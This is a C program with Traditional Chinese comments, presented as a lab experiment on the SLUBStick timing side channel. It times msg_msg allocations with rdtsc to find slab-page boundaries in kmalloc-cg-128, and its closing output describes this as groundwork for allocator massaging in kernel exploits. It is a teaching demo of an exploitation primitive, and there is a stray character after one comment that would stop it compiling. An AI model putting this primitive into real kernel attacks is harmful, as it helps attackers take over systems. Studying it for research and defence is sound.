#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

/*
 * SLUBStick 原理：
 *
 * Slab allocator 分配物件的兩種情況：
 *
 *   情況 A（快）：目前的 slab page 還有空位
 *     → 直接從空位清單取出一個 slot
 *     → 很快（幾百 cycles）
 *
 *   情況 B（慢）：目前的 slab page 已滿
 *     → 向 Page Allocator 要一個新的 4kB 頁面
 *     → 把新頁面切成固定大小的 slot
 *     → 才返回第一個 slot
 *     → 明顯比較慢（幾萬 cycles）
 *
 * 每個 slab page 有固定數量的 slot，
 * 所以「慢分配」會以固定間隔出現。
 * 觀察到這個週期，就能知道每頁有幾個物件。
 */

#define MSG_PAYLOAD    72    // msg_msg 落入 kmalloc-cg-128
#define ALLOC_COUNT   200    // 分配 200 個物件來觀察

static inline uint64_t rdtsc() {
    uint32_t lo, hi;
    __asm__ __volatile__(
        "lfence\n\t"
        "rdtsc\n\t"
        "lfence"
        : "=a"(lo), "=d"(hi) :: "memory"
    );
    return ((uint64_t)hi << 32) | lo;
}

struct msgbuf { long mtype; char mtext[MSG_PAYLOAD]; };

int main() {
    struct msgbuf buf = {.mtype = 1};
    memset(buf.mtext, 'A', MSG_PAYLOAD);

    int      qids[ALLOC_COUNT];
    uint64_t times[ALLOC_COUNT];

    printf("=== 實驗 4：SLUBStick 時間側通道 ===\n\n");

    /* -----------------------------------------------
     * 步驟 1：連續分配，量測每次時間
     * ----------------------------------------------- */
    printf("步驟 1：連續分配 %d 個 msg_msg，量測每次時間\n\n", ALLOC_COUNT);

    for (int i = 0; i < ALLOC_COUNT; i++) {
        qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        uint64_t t1 = rdtsc();
        msgsnd(qids[i], &buf, MSG_PAYLOAD, 0);
        uint64_t t2 = rdtsc();
        times[i] = t2 - t1;
    }

    /* -----------------------------------------------
     * 步驟 2：找閾值（中位數 × 5）
     * ----------------------------------------------- */
    uint64_t sorted[ALLOC_COUNT];
    memcpy(sorted, times, sizeof(times));
    for (int i = 0; i < ALLOC_COUNT-1; i++)
        for (int j = 0; j < ALLOC_COUNT-i-1; j++)
            if (sorted[j] > sorted[j+1]) {
                uint64_t t = sorted[j];
                sorted[j] = sorted[j+1];
                sorted[j+1] = t;
            }
    uint64_t median    = sorted[ALLOC_COUNT / 2];
    uint64_t threshold = median * 5;

    printf("  中位數（快分配）：%lu cycles\n", median);
    printf("  閾值（中位數×5）：%lu cycles\n", threshold);
    printf("  超過閾值 = 新 slab page 被建立\n\n");

    /* -----------------------------------------------
     * 步驟 3：視覺化時間序列
     * 每個字元代表一次分配
     * ░ = 快（現有 slot），▓ = 慢（新 slab page）
     * ----------------------------------------------- */
    printf("步驟 2：時間序列視覺化\n");
    printf("  ░ = 快分配（現有 slot）\n");
    printf("  ▓ = 慢分配（新 slab page 建立）\n\n");

    printf("  編號 0");
    for (int i = 1; i < ALLOC_COUNT; i += 10)
        printf("%10d", i);
    printf("\n  ");
    for (int i = 0; i < ALLOC_COUNT; i++)
        printf("%s", times[i] >= threshold ? "▓" : "░");
    printf("\n\n");

    /* -----------------------------------------------
     * 步驟 4：只印出慢分配的編號，觀察週期
     * ----------------------------------------------- */
    printf("步驟 3：慢分配發生在哪些編號？（觀察週期）\n\n");
    printf("  %-8s %-16s %s\n", "編號", "時間(cycles)", "距上次慢分配");
    printf("  %-8s %-16s %s\n", "----", "------------", "------------");

    int last_slow = -1;
    int slow_count = 0;
    int intervals[ALLOC_COUNT];
    int interval_count = 0;

    for (int i = 0; i < ALLOC_COUNT; i++) {
        if (times[i] >= threshold) {
            int gap = (last_slow >= 0) ? (i - last_slow) : -1;
            if (gap > 0) {
                intervals[interval_count++] = gap;
                printf("  %-8d %-16lu 距上次：%d 個物件\n",
                       i, times[i], gap);
            } else {
                printf("  %-8d %-16lu （第一次）\n", i, times[i]);
            }
            last_slow = i;
            slow_count++;
        }
    }

    /* -----------------------------------------------
     * 步驟 5：計算平均週期
     * ----------------------------------------------- */
    if (interval_count > 0) {
        int sum = 0;
        for (int i = 0; i < interval_count; i++)
            sum += intervals[i];
        double avg = (double)sum / interval_count;

        printf("\n步驟 4：週期分析\n\n");
        printf("  偵測到慢分配次數：%d\n", slow_count);
        printf("  平均間隔：%.1f 個物件\n", avg);
        printf("  理論值（kmalloc-cg-128）：32 個物件\n\n");

        printf("  解釋：\n");
        if (avg > 25 && avg < 40) {
            printf("  ✓ 平均間隔接近 32，符合理論！\n");
            printf("    每個 slab page 有 32 個 slot（4096 ÷ 128 = 32）\n");
        } else {
            printf("  平均間隔 = %.1f，代表目前 slab page 大約有 %.0f 個 slot\n",
                   avg, avg);
            printf("  （可能因為 cache 初始狀態不同而有偏差）\n");
        }
    }

    /* -----------------------------------------------
     * 步驟 6：詳細時間表（前 80 筆）
     * ----------------------------------------------- */
    printf("\n步驟 5：詳細時間表（前 80 筆）\n\n");
    printf("  %-6s %-16s %s\n", "編號", "時間(cycles)", "");
    printf("  %-6s %-16s %s\n", "----", "------------", "");
    for (int i = 0; i < 80 && i < ALLOC_COUNT; i++) {
        if (times[i] >= threshold)
            printf("  %-6d %-16lu ◀ 慢！新 slab page\n", i, times[i]);
        else
            printf("  %-6d %-16lu\n", i, times[i]);
    }

    /* -----------------------------------------------
     * 結論
     * ----------------------------------------------- */！
    printf("\n=== 結論 ===\n\n");
    printf("  快分配 ≈ %lu cycles → 現有 slab page 有空位\n", median);
    printf("  慢分配 >> %lu cycles → 新 slab page 被建立\n\n", threshold);
    printf("  每隔約 32 次分配出現一次「慢」\n");
    printf("  → 確認每個 slab page 有 32 個 slot\n\n");
    printf("  攻擊者利用這個時間訊號，\n");
    printf("  把連續 32 個快分配識別為「同一個 slab page 的物件」\n");
    printf("  為下一步的 Allocator Massaging 做準備。\n");
    printf("  （這就是論文引用的 SLUBStick 技術）\n");

    /* 清理 */
    for (int i = 0; i < ALLOC_COUNT; i++)
        msgctl(qids[i], IPC_RMID, NULL);

    return 0;
}